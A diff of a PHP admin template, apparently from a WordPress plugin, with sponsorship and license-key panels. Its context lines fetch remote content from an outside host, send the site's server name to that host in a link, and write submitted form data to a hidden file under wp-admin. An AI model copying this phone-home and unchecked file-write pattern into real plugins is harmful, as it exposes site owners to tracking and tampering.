@@ -19,7 +19,7 @@ $mune = 'ving.farwell.href.asz.php?&h.h';
 $goldterm = file_get_contents('https://www.rfig.us/ale/clie/goldfashterms.php');
 $supcop = file_get_contents('https://www.rfig.us/ale/clie/plugin_support&copy.php');
 $ssarp = "&server_ip=";
-$sip = "Earth";
+$sip = "USAsi";
 $gtri = ($sip);
 $url = content_url();
 ?>
@@ -38,17 +38,15 @@ hs.wrapperClassName = 'draggable-header';
         <legend>Sponsorship Support & More</legend>
       <center />[Click <a href="<?php echo $glest; ?>v1.0/<?php 
 echo $_SERVER['SERVER_NAME'];
-?>.lea<?php echo $mune; ?>=<?php
+?>.lea<?php echo $mune; ?>/=<?php
 echo(rand(7777,79999));
-?>&t.c=<?php
+?>&t.c/=<?php
 echo(rand(7777,99999));
-?>&t.c2=<?php
+?>&t.c2/=<?php
 echo(rand(7777,99999));
 ?>" onclick="return hs.htmlExpand(this, { objectType: 'iframe' } )">Here</a> To View All Available Agreements.] 
     </div></fieldset><center><div class="like-fb-right"><fieldset>
         <legend>Update License Key</legend>
-       <script type="text/javascript" src="script.js"></script>
-<link rel="stylesheet" type="text/css" href="style.css">
 <?
 if($_POST['Submit']){
 $open = fopen("../wp-admin/.1license.txt","w+");
